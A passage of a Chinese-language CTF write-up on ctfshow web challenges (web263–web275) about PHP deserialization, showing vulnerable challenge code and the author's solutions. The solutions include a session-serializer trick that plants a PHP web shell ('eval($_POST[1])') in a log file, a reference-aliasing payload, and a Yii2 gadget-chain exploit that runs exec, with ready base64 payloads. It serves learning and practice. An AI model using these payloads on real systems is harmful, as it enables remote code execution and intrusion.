class="hljs-keyword">public</span> <span class="hljs-variable">$status</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setStatus</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;status=<span class="hljs-variable">$s</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;log-&quot;</span>.<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-string">&quot;使用&quot;</span>.<span class="hljs-variable">$this</span>-&gt;password.<span class="hljs-string">&quot;登陆&quot;</span>.(<span class="hljs-variable">$this</span>-&gt;status?<span class="hljs-string">&quot;成功&quot;</span>:<span class="hljs-string">&quot;失败&quot;</span>).<span class="hljs-string">&quot;----&quot;</span>.<span class="hljs-title function_ invoke__">date_create</span>()-&gt;<span class="hljs-title function_ invoke__">format</span>(<span class="hljs-string">&#x27;Y-m-d H:i:s&#x27;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>文件的开头是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br></code></pre></td></tr></table></figure><p>另外 index.php 中有一处可以设置 session 的点, 而且并没有引用上面的 inc.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-comment">//超过5次禁止登陆</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]))&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limti&#x27;</span>]&gt;<span class="hljs-number">5</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;登陆失败次数超过限制&quot;</span>):<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]);<br><span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]) +<span class="hljs-number">1</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;limit&quot;</span>,<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;1&#x27;</span>));<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]= <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>check.php 开头</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;inc/inc.php&#x27;</span>;<br><span class="hljs-variable">$GET</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;u&quot;</span>=&gt;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>],<span class="hljs-string">&quot;pass&quot;</span>=&gt;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>这边比较懵了引用一下其他的内容</p><p>php.ini配置文件当中有关session存储的配置</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">session.save<span class="hljs-emphasis">_path=&quot;&quot;  --设置session的存储路径</span><br><span class="hljs-emphasis">session.save_</span>handler=&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)<br>session.auto<span class="hljs-emphasis">_start  boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span><br><span class="hljs-emphasis">session.serialize_</span>handler  string --定义用来序列化/反序列化的处理器名字。默认使用php <br></code></pre></td></tr></table></figure><p>session.serialize_handler是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’);</p><p>inc.php 里显式的设置了 php 这个 handler,index.php 使用 php_serialize handler 序列化我们传入的 cookie 值, 生成对应的 session 文件 inc.php 里使用 php handler 反序列化 session 文件我们利用 php handler 中的 <code>|</code> 来进行反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;123.php&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;|&#x27;</span>.<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>()));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">limit=fE86NDoiVXNlciI6Mjp7czo4OiJ1c2VybmFtZSI7czo3OiIxMjMucGhwIjtzOjg6InBhc3N3b3JkIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4iO30%3D<br></code></pre></td></tr></table></figure><p>先访问index.php，里面传在cookie里面传，然后在check.php里面传，最后网页访问<code>log-123.php</code>连接。</p><h2 id="web264"><a class="markdownIt-Anchor" href="#web264"></a> web264</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-variable">$m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>];<br><span class="hljs-variable">$t</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$f</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$t</span>))&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>(<span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span>);<br>    <span class="hljs-variable">$umsg</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>));<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$umsg</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your message has been sent&#x27;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>方法同web262的0x02</p><h2 id="web265"><a class="markdownIt-Anchor" href="#web265"></a> web265</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowAdmin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$t</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;token=<span class="hljs-variable">$t</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;token===<span class="hljs-variable language_">$this</span>-&gt;password;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$ctfshow</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctfshow&#x27;</span>]);<br><span class="hljs-variable">$ctfshow</span>-&gt;token=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ctfshow</span>-&gt;<span class="hljs-title function_ invoke__">login</span>())&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowAdmin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;password =&amp;<span class="hljs-variable language_">$this</span>-&gt;token;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$exp</span> =<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshowAdmin</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ctfshow=O:12:<span class="hljs-string">&quot;ctfshowAdmin&quot;</span>:2:&#123;s:5:<span class="hljs-string">&quot;token&quot;</span>;N;s:8:<span class="hljs-string">&quot;password&quot;</span>;R:2;&#125;<br></code></pre></td></tr></table></figure><h2 id="web266"><a class="markdownIt-Anchor" href="#web266"></a> web266</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$cs</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable language_">$this</span>-&gt;password;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ctfshowo</span>=@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$cs</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfshow/&#x27;</span>, <span class="hljs-variable">$cs</span>))&#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Error <span class="hljs-subst">$ctfshowo</span>&quot;</span>,<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$cs</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$exp</span> =<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);<br></code></pre></td></tr></table></figure><p>把ctfshow大写字母，然后bp发包得到flag</p><h2 id="web267"><a class="markdownIt-Anchor" href="#web267"></a> web267</h2><p><a href="https://blog.csdn.net/cosmoslin/article/details/120612714">参考链接</a></p><p>首先弱密码登陆后台<code>admin::admin</code></p><p>然后在about里面查看源码得到提示</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-10-28204910.png" alt="2024-10-28204910"></p><p>拼接起来</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">/index.php?r=site%2Fabout&amp;view-source<br></code></pre></td></tr></table></figure><p>此处有后门</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">///backdoor/shell<br>unserialize(base64<span class="hljs-emphasis">_decode($GET[&#x27;code&#x27;]))</span><br></code></pre></td></tr></table></figure><p>然后直接利用链子吧，因为平常考察的不多我只做了解</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">yii</span>\<span class="hljs-title class_">rest</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">CreateAction</span>&#123;<br>        <span class="hljs-title class_">public</span> $<span class="hljs-title class_">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;exec&#x27;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;id = <span class="hljs-string">&#x27;cp /flag /var/www/html/basic/web/1.txt&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Faker</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">yii</span>\<span class="hljs-title class_">rest</span>\<span class="hljs-title class_">CreateAction</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$formatters</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;close&#x27;</span>] = [<span class="hljs-keyword">new</span> <span class="hljs-title class_">CreateAction</span>, <span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">yii</span>\<span class="hljs-title class_">db</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Faker</span>\<span class="hljs-title class_">Generator</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$_dataReader</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span>&#123;<br>    <span class="hljs-title class_">echo</span> <span class="hljs-title class_">base64_encode</span>(<span class="hljs-title class_">serialize</span>(<span class="hljs-title class_">new</span> <span class="hljs-title class_">yii</span>\<span class="hljs-title class_">db</span>\<span class="hljs-title class_">BatchQueryResult</span>));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NDoiZXhlYyI7czoyOiJpZCI7czozODoiY3AgL2ZsYWcgL3Zhci93d3cvaHRtbC9iYXNpYy93ZWIvMS50eHQiO31pOjE7czozOiJydW4iO319fX0=<br></code></pre></td></tr></table></figure><h2 id="web268-web274跳过"><a class="markdownIt-Anchor" href="#web268-web274跳过"></a> Web268-web274(跳过)</h2><h2 id="web275"><a class="markdownIt-Anchor" href="#web275"></a> web275</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">filter</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filecontent</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$evilfile</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$fn</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename=<span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;filecontent=<span class="hljs-variable">$fn</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkevil</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/php|\.\./i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;filename))&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;evilfile=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;filecontent))&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;evilfile=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;evilfile;<br>    &#125;<br>    